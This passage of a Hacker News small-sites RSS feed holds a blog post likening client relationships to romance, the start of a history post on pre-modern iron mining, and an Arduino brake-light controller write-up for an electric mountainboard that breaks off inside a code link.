September 18, 2020 | https://www.leshenko.net/p/ugit/ | <a href="https://web.archive.org/web/*/https://www.leshenko.net/p/ugit/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    <p>Loading...</p>
    <section>
        
        
        
    </section>

    <section>
        
        
        <details>
            <summary>Download</summary>
            <p><span>Clone μgit using:</span>
                <span id="clone-cmd"></span>
                

                <span>Checkout this commit:</span>
                <span id="checkout-cmd"></span>
                
            </p>
        </details>
    </section>

    

    

    

    


</div>]]>
            </description>
            <link>https://www.leshenko.net/p/ugit/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24517925</guid>
            <pubDate>Fri, 18 Sep 2020 15:22:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dating Our Clients]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24517907">thread link</a>) | @mcrittenden
<br/>
September 18, 2020 | https://critter.blog/2020/09/18/dating-our-clients/ | <a href="https://web.archive.org/web/*/https://critter.blog/2020/09/18/dating-our-clients/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-content" role="main">

	
<article id="post-1408">

	
<!-- .entry-header -->

	<div>

		<div>

			
<p>Client relationships have a lot in common with romantic relationships. This is <a href="https://creative-boost.com/client-relationships-are-like-dating/">well</a> <a href="https://www.leightoninteractive.com/blog/how-a-client-relationship-is-like-dating">documented</a> <a href="https://www.birdseed.io/business-customer-relationship-lot-like-dating/">elsewhere</a>. </p>



<p>Let’s start with the obvious parallels:</p>



<ul><li><em>Flirting and courting</em> = the sales process and trying to win the bid</li><li><em>Facebook official</em> = signing the contract</li><li><em>The honeymoon phase</em> = the first couple sprints when everything is still exciting and new</li><li><em>The first fight</em> = the first disagreement (often about scope)</li><li><em>The messy breakup </em>= using the termination clause in the contract</li><li><em>The amicable breakup </em>= a successful completion of the project</li><li><em>The messy divorce </em>= someone gets sued</li><li><em>The long term relationship = </em>a trusting partnership with no end date (this is the holy grail for many people, but not all)</li></ul>



<p>“<em>But romantic relationships are about love! Client relationships are about money! That is an important difference!</em>” That’s why I didn’t say that client relationships are <em>exactly </em>like romantic ones. But to be fair, aren’t both love and money about mutual benefit?</p>



<p>I could keep going and start talking about where kids and joint mortgages fit in, but it all gets very boring.</p>



<p>It’s more interesting when we apply the power dynamics of romantic relationships. Esther Perel, a well known psychotherapist and speaker, was <a href="https://tim.blog/2017/05/21/esther-perel/">on the Tim Ferriss podcast</a> a few years back. She said something that stuck with me enough to motivate me to spend 15 minutes finding the exact quote:</p>



<blockquote><p>In every couple you will often find one person who is more in touch with the <em>fear of losing the other</em>, and one person who is more in touch with the <em>fear of losing themselves</em>. </p><p>One person more in touch with the <em>fear of abandonment</em>, and one person more in touch with the <em>fear of suffocation</em>.</p><cite>Esther Perel (<a href="https://tim.blog/2018/06/01/the-tim-ferriss-show-transcripts-esther-perel/#:~:text=Every%20couple%20has%20a%20setup.%20It%E2%80%99s%20an%20organization.%20In%20every%20couple%20you%20will%20often%20find%20one%20person%20who%20is%20more%20in%20touch%20with%20the%20fear%20of%20losing%20the%20other%2C%20and%20one%20person%20who%20is%20more%20in%20touch%20with%20the%20fear%20of%20losing%20themselves.%20One%20person%20more%20in%20touch%20with%20the%20fear%20of%20abandonment%2C%20and%20one%20person%20more%20in%20touch%20with%20the%20fear%20of%20suffocation">transcript here</a>)</cite></blockquote>



<p>Are client relationships like that? I think so. It could go either way:</p>



<ul><li>The client is afraid that the contractor whom they rely on will move onto a higher paying or more interesting client (<em>fear of abandonment</em>)</li><li>The contractor is afraid that continuing to work with their client will prevent them from growing and learning new things (<em>fear of suffocation</em>)</li></ul>



<p>Or, going the other way:</p>



<ul><li>The client is afraid that the contractor’s low quality work or outdated solutions will hold them back (<em>fear of suffocation</em>)</li><li>The contractor is afraid that the client will fire them and hire someone selling shiny new unproven technology (<em>fear of abandonment</em>)</li></ul>



<p>Does any of that sound familiar? It does to me.</p>



<p>Who holds the most power in those situations? Obviously we’d prefer that whatever side we’re on has the power. But ideally both sides would hold equal power, so neither side needs to act out of fear.</p>



<p>It sounds like a chicken/egg problem: do we equalize power by getting rid of fear, or do we get rid of fear by equalizing power? But that’s a false dichotomy. Those are both symptoms of the larger issue: we aren’t communicating. Fix the communication and we fix both symptoms of it.</p>



<p>In a romantic relationship, we’d want to talk about this stuff, right? Get it out in the open and have a mature, honest conversation. Maybe even see a relationship counselor. </p>



<p>So why not do that with our client? It goes back to my post “<a href="https://critter.blog/2020/08/25/hide-a-problem-from-your-client-and-now-youve-got-2-problems/">Hide a problem from your client and now you’ve got 2&nbsp;problems</a>“. If we’re feeling a fear of suffocation or abandonment, or we suspect that they are, why wouldn’t we bring it up and talk through it with them?</p>



<p>What do you think? <a href="https://twitter.com/mcrittenden">Tweet me</a>!</p>

		</div><!-- .entry-content -->

	</div><!-- .post-inner -->

	<!-- .section-inner -->

	
	<!-- .pagination-single -->

	
</article><!-- .post -->

</div></div>]]>
            </description>
            <link>https://critter.blog/2020/09/18/dating-our-clients/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24517907</guid>
            <pubDate>Fri, 18 Sep 2020 15:20:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Iron, How Did They Make It? Part I, Mining]]>
            </title>
            <description>
<![CDATA[
Score 259 | Comments 62 (<a href="https://news.ycombinator.com/item?id=24517792">thread link</a>) | @dddddaviddddd
<br/>
September 18, 2020 | https://acoup.blog/2020/09/18/collections-iron-how-did-they-make-it-part-i-mining/ | <a href="https://web.archive.org/web/*/https://acoup.blog/2020/09/18/collections-iron-how-did-they-make-it-part-i-mining/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>This week we are starting a four-part look at pre-modern iron and steel production.  As with our series on farming, we are going to follow the train of iron production from the mine to a finished object, be that a tool, a piece of armor, a simple nail, a weapon or some other object.  <strong>And I want to stress that broad framing</strong>: iron was made into more things than <em>just</em> swords (although swords are cool).  If you are here wondering how you go from iron-bearing rocks to a sword, these posts will tell you, but they will equally get you from those same rocks to a nail, or a workman’s hammer, or a sawblade, or a pot, or a decorative iron spiral, or a belt-buckle, or any other of a multitude of things that might be produced in iron.</p>



<p>Iron production is a unique topic in one key way.  If the problem with <a href="https://acoup.blog/2020/07/24/collections-bread-how-did-they-make-it-part-i-farmers/">farmers </a>is that the popular understanding of the past (either historical or fantastical) renders them <a href="https://acoup.blog/2019/07/12/collections-the-lonely-city-part-i-the-ideal-city/">effectively invisible</a> – as indeed, it tends to render <em>most</em> ancient forms of production invisible – <strong>iron-working is tremendously visible, but in a series of motifs that are almost completely</strong> <em><strong>wrong</strong></em>.  Iron is treated as rare when it is common, melted in societies that almost certainly lack the furnaces to do so; swords are cast when they should be forged, quenched in ways that would ruin them and the work of the iron-worker is represented as a solitary activity when every stage of iron-working, when done at any kind of scale, was a team job (many modern traditional blacksmiths work alone, often as a hobby; ancient smiths generally did not).  The popular depiction is so consistently wrong that it doesn’t really even provide a firm basis for correction.  <strong>We are going to have to start over, from the beginning</strong>.</p>



<p><strong>So this first post is going to focus on mining</strong>.  Next week we’ll take a look at ore processing, smelting in more detail, along with the pressing issue of fuel.  The week after that we’ll look at the basic principles behind forging.  And finally in the last week, we’ll ask what one might do if they wanted <em>steel</em> instead of iron.  As with the farming posts, there are likely to be some addendum (at least one, on Wootz steel, for sure).  <strong>Throughout all of this, we are going to look not only at the processes by which these objects were produced, but also the people who did that production.</strong></p>



<figure><img data-attachment-id="4507" data-permalink="https://acoup.blog/saam-1910-9-11_1/" data-orig-file="https://acoupdotblog.files.wordpress.com/2020/09/saam-1910.9.11_1.jpg" data-orig-size="800,480" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="saam-1910.9.11_1" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2020/09/saam-1910.9.11_1.jpg?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2020/09/saam-1910.9.11_1.jpg?w=800" src="https://acoupdotblog.files.wordpress.com/2020/09/saam-1910.9.11_1.jpg?w=800" alt="" srcset="https://acoupdotblog.files.wordpress.com/2020/09/saam-1910.9.11_1.jpg 800w, https://acoupdotblog.files.wordpress.com/2020/09/saam-1910.9.11_1.jpg?w=150 150w, https://acoupdotblog.files.wordpress.com/2020/09/saam-1910.9.11_1.jpg?w=300 300w, https://acoupdotblog.files.wordpress.com/2020/09/saam-1910.9.11_1.jpg?w=768 768w" sizes="(max-width: 800px) 100vw, 800px"><figcaption><a href="https://americanart.si.edu/artwork/iron-mine-port-henry-new-york-16373">Via the Smithsonian</a>, a painting of an iron mine by Homer Dodge Martin (c. 1862) at Port Henry, New York.  By the 1800s, increases demand for iron ore to fuel the industrial revolution had made larger underground iron mines more common.  Here you can actually see the tailings (rock with little or no iron content which is sorted out at the mine) littering the rock face down to the shore.</figcaption></figure>



<p><strong>As with farming, there is a regional and chronological caveat necessary here</strong>: my research into metal production (and this, even more than farming, is core to my academic interests) is focused on the Roman world or – more broadly – on the broader Mediterranean and European tradition of metal-working.  There are some points where it will be necessary to note different methods or techniques in other parts of the world (early cast iron in China, for instance, or Wootz steel in India).  Likewise, I will do my best to capture changes in metal-working techniques in the medieval period.  What I am <em><strong>not </strong></em>going to cover in detail is <em>modern</em> steel and iron-working (that is, post-industrial-revolution), though I will occasionally note how it is different (the largest difference, by far, is that modern steel-making approaches the carbon problem from the opposite direction, with processes to <em>remove</em> carbon, instead of processes to add carbon).</p>



<p>I should also note that this post is going to focus on <em>iron</em>-working (and steel-working).  Copper and bronze, the other major tool-metals, are quite different (and may get their own series at some point)!</p>



<p>As always, if you like what you are reading here, please share it; if you really like it, you can support me on <a href="https://www.patreon.com/user?u=20122096">Patreon</a>. And if you want updates whenever a new post appears, you can click below for email updates or follow me on twitter (@BretDevereaux) for updates as to new posts as well as my occasional ancient history, foreign policy or military history musings.</p>





<p><strong>Bibliography Note at the Outset</strong>: For the sake of keeping these posts readable, especially since I don’t have a footnote function here, I am not going to laboriously cite everything at each point of reference, but instead I am going to include a bibliography up-front for the entire series.  For the beginner looking to get a basic handle on the pre-modern iron-production process, I think D. Sim &amp; I. Ridge, <em>Iron for the Eagles: The Iron Industry of Roman Britain</em> (2002) offers one of the best whole-process overviews.  On technical details of the forging process, note A.W. Bealer, <em>The Art of Blacksmithing</em> (1969), though much of the same may be learned by conversing with traditional blacksmiths.  H. Hodges, <em>Artifacts: An Introduction to Early Materials and Technology</em> (1989) is more diffuse, but still has some useful information on metal production.<br>There is a robust if somewhat aging literature on Roman mining and metallurgy.  Of particular note are (in publication order) J.F. Healy, <em>Mining and Metallurgy in the Greek and Roman World</em> (1978); R.F. Tylecote, <em>The Early History of Metallurgy in Europe</em> (1987); R. Shepherd, <em>Ancient Mining</em> (1993); P. Craddock, <em>Early Metal Mining and Production </em>(1995); V.F. Buchwald, <em>Iron and Steel in Ancient Times</em> (2005).  Each of these volumes has their own advantages.  Healy and Shepherd are more narrowly focused on Greek and Roman antiquity; Healy has the better coverage of processes, Shepherd the better catalog of known metal mining and processing sites in antiquity.  Both Tylecote and Craddock have a wider chronological reach; Craddock is in some ways an update of Tylecote, but the former has a stronger focus on artifacts than the latter.  Buchwald is narrowly focused on iron (the others all consider at least bronze, if not also non-tool metals) and of course, the most recent.  Finding any study on the condition of medieval mine-workers was difficult (being so far out of my field), but note J.U. Nef, “Mining and Metallurgy in medieval Civilisation” in <em>The Cambridge Economic History</em> <em>of Europe</em>, <em>volume 2: Trade and Industry in the Middle Ages</em>, 2nd. ed. (1987): 691-761.<br>For the particulars of how that iron might be turned into armor, note D. Sim and J. Kaminski, <em>Roman Imperial Armour: The Production of Early Imperial Military Armour</em> (2012) for the Roman period and A. Williams, <em>The Knight and the Blast Furnace: A history of the metallurgy of armour in the Middle Ages &amp; the early modern period</em> (2003).  For metallurgy as it fits into mobilization more generally, J. Landers, <em>The Field and the Forge: Population, Production and Power in the Pre-Industrial West</em> (2003) is a peerless starting point.<br>On the value and trade in metals in the ancient world, of particular note are M. Treister, <em>The Role of Metals in Ancient Greek History</em> (1996) and L. Bray, “‘Horrible, Speculative, Nasty, Dangerous’: Assessing the Value of Roman Iron,” <em>Britannia</em> 41 (2010): 175-185.  Both of these have valuable price-data from the ancient world.</p>



<h2>Iron Ores</h2>



<p>In most video games, if you are looking to produce some iron things, the first problem you invariably have is <em>finding some iron</em> <em>ores</em>.  Often iron is some sort of<a href="https://civilization.fandom.com/wiki/Iron_(Civ4)"> semi-rare strategic resource</a> available in <a href="https://anno1800.fandom.com/wiki/Iron_Mine">only certain parts of the map</a>, something that factions might fight over.  Actually finding some iron might be a serious problem.</p>



<p>Well, I have good news for <em>historical</em> you as compared to <em>video game</em> you: iron is the fourth most common <a href="https://en.wikipedia.org/wiki/Abundance_of_elements_in_Earth%27s_crust#cite_note-7">element in earth’s crust</a>, making up around 5% of the total mass of the part of the earth we can actually mine. Modern industry produces – and I mean this very literally – a <em>billion tons</em> (and change) of iron per year.  Iron is about the exact opposite of rare; almost all of the major ores of iron are dirt common.  <strong>And that’s the point</strong>.</p>



<p>One of the reasons that the change from using bronze (or copper) as tool metals to using iron was so important historically is that iron is just <em>so damn abundant</em>.  Of course iron can be used to make <em>better</em> tools and weapons as well, but only with proper treatment: initially, the advantage in iron was that it was <em>cheap</em>.  Now, as we’ll see, while the abundance of iron makes it cheap, the difficulty in working it poses technological problems; that’s why the far rarer and also generally inferior (to proper, work-hardened, heat-treated iron or steel; bronze will often exceed the performance of unalloyed iron) copper and bronze were used first: harder to find, easier to work.  We’ll get to the major problems with iron-working in subsequent weeks (they are in the processing, not the mining), but in brief the problems iron has is that it has a much higher melting point and that <em>cast</em> iron is functionally useless.  <strong>But let’s get back to those sources of iron</strong>.</p>



<p>Very small amounts of iron occur on earth as pure ‘native’ metal; the term for this, “<a href="https://en.wikipedia.org/wiki/Meteoric_iron">meteoric iron</a>” is an accurate description of where it comes from (there is also one known deposit of native ‘<a href="https://en.wikipedia.org/wiki/Telluric_iron">telluric iron</a>‘); in practice, the sum total of these iron sources is effectively a rounding error on the amount of iron an iron-age society is going to need and so ‘pure’ iron may be disregarded as a meaningful source of iron.</p>



<figure><img data-attachment-id="4509" data-permalink="https://acoup.blog/hematite_streak_plate/" data-orig-file="https://acoupdotblog.files.wordpress.com/2020/09/hematite_streak_plate.jpg" data-orig-size="1280,547" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;4&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;Canon PowerShot SX710 HS&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;1451453273&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;4.5&quot;,&quot;iso&quot;:&quot;800&quot;,&quot;shutter_speed&quot;:&quot;0.008&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="hematite_streak_plate" data-image-description="" data-medium-file="https://acoupdotblog.files.wordpress.com/2020/09/hematite_streak_plate.jpg?w=300" data-large-file="https://acoupdotblog.files.wordpress.com/2020/09/hematite_streak_plate.jpg?w=1024" src="https://acoupdotblog.files.wordpress.com/2020/09/hematite_streak_plate.jpg?w=1024" alt="" srcset="https://acoupdotblog.files.wordpress.com/2020/09/hematite_streak_plate.jpg?w=1024 1024w, https://acoupdotblog.files.wordpress.com/2020/09/hematite_streak_plate.jpg?w=150 150w, https://acoupdotblog.files.wordpress.com/2020/09/hematite_streak_plate.jpg?w=300 300w, https://acoupdotblog.files.wordpress.com/2020/09/hematite_streak_plate.jpg?w=768 768w, https://acoupdotblog.files.wordpress.com/2020/09/hematite_streak_plate.jpg 1280w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption><a href="https://en.wikipedia.org/wiki/Hematite">Via Wikipedia</a>, Hematite, leaving its characteristic red-rust streak.  The hematite on the left has a metallic lustre, whereas the hematite on the right has the (more common) earthy lustre.</figcaption></figure>



<p><strong>Instead, basically all iron was smelted from iron ores which required considerable processing to produce a pure metal</strong>.  There are quite a lot of ores of iron, but not all of them could be usefully processed with ancient or medieval technology.  The most commonly used iron ore was hematite (Fe<sub>2</sub>O<sub>3</sub>), with goethite (HFeO<sub>2</sub>) and limonite (FeO(OH)·<em>n</em>H<sub>2</sub>O) close behind.  Rarer, but still used was …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://acoup.blog/2020/09/18/collections-iron-how-did-they-make-it-part-i-mining/">https://acoup.blog/2020/09/18/collections-iron-how-did-they-make-it-part-i-mining/</a></em></p>]]>
            </description>
            <link>https://acoup.blog/2020/09/18/collections-iron-how-did-they-make-it-part-i-mining/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24517792</guid>
            <pubDate>Fri, 18 Sep 2020 15:13:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Evening Project: Arduino based brake light controller for Electric Mountainboard]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24517767">thread link</a>) | @gcds
<br/>
September 18, 2020 | https://www.techprowd.com/evening-project-arduino-based-brake-light-controller-for-vesc/ | <a href="https://web.archive.org/web/*/https://www.techprowd.com/evening-project-arduino-based-brake-light-controller-for-vesc/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://images.unsplash.com/photo-1586202172425-9399d2ab1d7a?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 300w,
                            https://images.unsplash.com/photo-1586202172425-9399d2ab1d7a?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 600w,
                            https://images.unsplash.com/photo-1586202172425-9399d2ab1d7a?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 1000w,
                            https://images.unsplash.com/photo-1586202172425-9399d2ab1d7a?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://images.unsplash.com/photo-1586202172425-9399d2ab1d7a?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ" alt="Evening Project: Arduino based brake light controller for VESC based Electric Mountainboard">
            </figure>

            <section>
                <div>
                    <p>I had a small request from my father to help him develop a small firmware for Arduino to control brake LED light for his electric mountain board, integrating with VESC to receive remote controller UART packets.</p><h2 id="some-explanations">Some explanations</h2><p>I know some of you have not heard Arduino, VESC, Electric Mountainboard, and similar terms.</p><h3 id="arduino">Arduino</h3><p><a href="https://www.arduino.cc/">Arduino</a> is an open-source hardware and software project and user community that designs and manufactures single-board microcontrollers and microcontroller kits for building digital devices.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-71.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-71.png 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/image-71.png 1000w, https://www.techprowd.com/content/images/2020/09/image-71.png 1020w" sizes="(min-width: 720px) 720px"></figure><p>In this project, our target will be the Arduino Pro Micro board based on the <a href="https://www.microchip.com/wwwproducts/en/ATmega32u4">ATMega32U4</a> processor featuring 32 KB self-programming flash program memory, 2.5 KB SRAM, 1 KB EEPROM, USB 2.0 full-speed/low-speed device, 12-channel 10-bit A/D-converter, and JTAG interface for on-chip-debug. The device achieves up to 16 MIPS throughput at 16 MHz. 2.7-5.5 volt operation.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-72.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-72.png 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/image-72.png 1000w, https://www.techprowd.com/content/images/2020/09/image-72.png 1032w" sizes="(min-width: 720px) 720px"></figure><h3 id="vesc">VESC</h3><p>The <a href="https://vesc-project.com/">VESC</a> (which stands for Vedder Electronic Speed Controller) is a more advanced ESC that allows for better motor and battery protection, regenerative braking, and programming options like acceleration-deceleration curves and other advanced features.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-73.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-73.png 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/image-73.png 1000w, https://www.techprowd.com/content/images/size/w1600/2020/09/image-73.png 1600w, https://www.techprowd.com/content/images/size/w2400/2020/09/image-73.png 2400w" sizes="(min-width: 720px) 720px"></figure><p>It is an open-source ESC project and has many hardware projects based on its firmware.</p><h3 id="electric-mountainboard">Electric Mountainboard</h3><p>The Electric mountainboard, in simple terms, is an electrified mountainboard.</p><figure><div><div><p><img src="https://www.techprowd.com/content/images/2020/09/8f33cade74c24f736ed44c578e1c18ae28827b2c.jpeg" width="1024" height="768" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/8f33cade74c24f736ed44c578e1c18ae28827b2c.jpeg 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/8f33cade74c24f736ed44c578e1c18ae28827b2c.jpeg 1000w, https://www.techprowd.com/content/images/2020/09/8f33cade74c24f736ed44c578e1c18ae28827b2c.jpeg 1024w" sizes="(min-width: 720px) 720px"></p><p><img src="https://www.techprowd.com/content/images/2020/09/E39600C3-2413-43EF-942B-4A1E5CDEF838_1_201_a.jpeg" width="4032" height="2877" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/E39600C3-2413-43EF-942B-4A1E5CDEF838_1_201_a.jpeg 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/E39600C3-2413-43EF-942B-4A1E5CDEF838_1_201_a.jpeg 1000w, https://www.techprowd.com/content/images/size/w1600/2020/09/E39600C3-2413-43EF-942B-4A1E5CDEF838_1_201_a.jpeg 1600w, https://www.techprowd.com/content/images/size/w2400/2020/09/E39600C3-2413-43EF-942B-4A1E5CDEF838_1_201_a.jpeg 2400w" sizes="(min-width: 720px) 720px"></p></div><div><p><img src="https://www.techprowd.com/content/images/2020/09/B6DC592A-7BAC-4C63-BAE0-BECE6B27B1B0_1_105_c.jpeg" width="1024" height="768" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/B6DC592A-7BAC-4C63-BAE0-BECE6B27B1B0_1_105_c.jpeg 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/B6DC592A-7BAC-4C63-BAE0-BECE6B27B1B0_1_105_c.jpeg 1000w, https://www.techprowd.com/content/images/2020/09/B6DC592A-7BAC-4C63-BAE0-BECE6B27B1B0_1_105_c.jpeg 1024w" sizes="(min-width: 720px) 720px"></p><p><img src="https://www.techprowd.com/content/images/2020/09/A2778403-AEE3-46E6-858E-BC5C074B4875_1_105_c.jpeg" width="768" height="1024" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/A2778403-AEE3-46E6-858E-BC5C074B4875_1_105_c.jpeg 600w, https://www.techprowd.com/content/images/2020/09/A2778403-AEE3-46E6-858E-BC5C074B4875_1_105_c.jpeg 768w" sizes="(min-width: 720px) 720px"></p></div></div></figure><p>Mountainboarding, also known as Dirtboarding, Offroad Boarding, and All-Terrain Boarding (ATB), is a well established[1] if little-known action sport, derived from snowboarding. This was initially pioneered by James Stanley during a visit in the 1900s to the Matterhorn where snow was not available. A mountainboard is made up of components including a deck, bindings to secure the rider to the deck, four wheels with pneumatic tires, and two steering mechanisms known as trucks. Mountainboarders, also known as riders, ride specifically designed boardercross tracks, slopestyle parks, grass hills, woodlands, gravel tracks, streets, skateparks, ski resorts, BMX courses, and mountain bike trails. It is this ability to ride such a variety of terrain that makes mountainboarding different from other board sports.</p><h2 id="remote-controller">Remote Controller</h2><figure><img src="https://www.techprowd.com/content/images/2020/09/image-77.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-77.png 600w, https://www.techprowd.com/content/images/2020/09/image-77.png 768w" sizes="(min-width: 720px) 720px"></figure><h2 id="the-leading-subject-the-brake-light">The leading subject the Brake Light</h2><figure><div><div><p><img src="https://www.techprowd.com/content/images/2020/09/2020-09-18-19.13.18.jpg" width="1280" height="960" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/2020-09-18-19.13.18.jpg 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/2020-09-18-19.13.18.jpg 1000w, https://www.techprowd.com/content/images/2020/09/2020-09-18-19.13.18.jpg 1280w" sizes="(min-width: 720px) 720px"></p><p><img src="https://www.techprowd.com/content/images/2020/09/2020-09-18-19.13.13.jpg" width="1280" height="960" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/2020-09-18-19.13.13.jpg 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/2020-09-18-19.13.13.jpg 1000w, https://www.techprowd.com/content/images/2020/09/2020-09-18-19.13.13.jpg 1280w" sizes="(min-width: 720px) 720px"></p><p><img src="https://www.techprowd.com/content/images/2020/09/2020-09-18-19.13.26.jpg" width="1280" height="960" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/2020-09-18-19.13.26.jpg 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/2020-09-18-19.13.26.jpg 1000w, https://www.techprowd.com/content/images/2020/09/2020-09-18-19.13.26.jpg 1280w" sizes="(min-width: 720px) 720px"></p></div></div></figure><p>This article's main subject is brake light, which is needed to work like car brake lights.</p><ul><li>Then the board is powered, it should shine with the brightness of around 45%</li><li>When the remote controller starts sending a brake signal, the Arduino should pick up the packets from the remote controller receiver, which are being sent to VESC and set brightness to 100% and return to 45% when the brake signal is released.</li></ul><p>The LED lamp is powered by the Mean Well LDD-H series LED driver, which can control LED brightness by providing a PWM signal.</p><p>The board is powered by 12S Li-Ion cells based battery pack with a standard voltage of 44.4V and a fully charged voltage of 50.4V.</p><figure><img src="https://www.techprowd.com/content/images/2020/09/image-75.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-75.png 600w, https://www.techprowd.com/content/images/2020/09/image-75.png 1000w" sizes="(min-width: 720px) 720px"></figure><h2 id="schematic">Schematic</h2><figure><img src="https://www.techprowd.com/content/images/2020/09/image-76.png" alt="" srcset="https://www.techprowd.com/content/images/size/w600/2020/09/image-76.png 600w, https://www.techprowd.com/content/images/size/w1000/2020/09/image-76.png 1000w, https://www.techprowd.com/content/images/size/w1600/2020/09/image-76.png 1600w, https://www.techprowd.com/content/images/size/w2400/2020/09/image-76.png 2400w"></figure><p>The schematic idea is pretty simple. Arduino receives the same packets as VESC from receiver via <a href="https://en.wikipedia.org/wiki/Universal_asynchronous_receiver-transmitter">UART</a>, from which I can decode the throttle position and accordingly adjust brake lights via <a href="https://en.wikipedia.org/wiki/Pulse-width_modulation">PWM</a> signal on LED driver.</p><h2 id="firmware">Firmware</h2><p>For firmware, I will be using Arduino software to write the firmware with C++ with some helper functions, instead of bit-banging registers by myself.</p><h3 id="first-step-vesc-packet-listener-handler">First step Vesc Packet Listener &amp; Handler</h3><p>To determine the throttle position of the Remote controller, I need to parse incoming serial data from the receiver as this type of remote controller uses VESC UART style control instead of a typical PPM (RC controller similar to PWM) style control mechanism.</p><p>I have built a small class to parse incoming serial data and extract the payload out of the received packet. I used <a href="https://github.com/SolidGeek/VescUart">SolidGeek/VescUart</a> library as a reference for the code. Added some magic to be able quickly to hook callback when a specific type of commands there received.</p><!--kg-card-begin: markdown--><p><a href="https://carbon.now.sh/?bg=rgba(171%2C%20184%2C%20195%2C%201)&amp;t=seti&amp;wt=none&amp;l=text%2Fx-c%2B%2Bsrc&amp;ds=true&amp;dsyoff=20px&amp;dsblur=68px&amp;wc=true&amp;wa=true&amp;pv=56px&amp;ph=56px&amp;ln=false&amp;fl=1&amp;fm=Hack&amp;fs=14px&amp;lh=133%25&amp;si=false&amp;es=2x&amp;wm=false&amp;code=%2523pragma%2520once%250A%250A%2523include%2520%253CHardwareSerial.h%253E%250A%2523include%2520%2522vesc_types.h%2522%250A%250Atypedef%2520void%2520(*vesc_command_handler_callback)(uint8_t%2520*payload%252C%2520uint16_t%2520length)%253B%250A%250Atypedef%2520struct%2520%257B%250A%2520%2520%2520%2520vesc_command_id%2520commandId%253B%250A%2520%2520%2520%2520vesc_command_handler_callback%2520callback%253B%250A%257D%2520vesc_command_handler%253B%250A%250Aclass%2520VescUart%2520%257B%250Apublic%253A%250A%2520%2520%2520%2520explicit%2520VescUart(HardwareSerial%2520*port)%2520%257B%250A%2520%2520%2520%2520%2520%2520%2520%2520this-%253EcommandHandlers%2520%253D%2520(vesc_command_handler%2520*)%2520malloc(sizeof(vesc_command_handler))%253B%250A%2520%2520%2520%2520%2520%2520%2520%2520this-%253EcommandHandlerS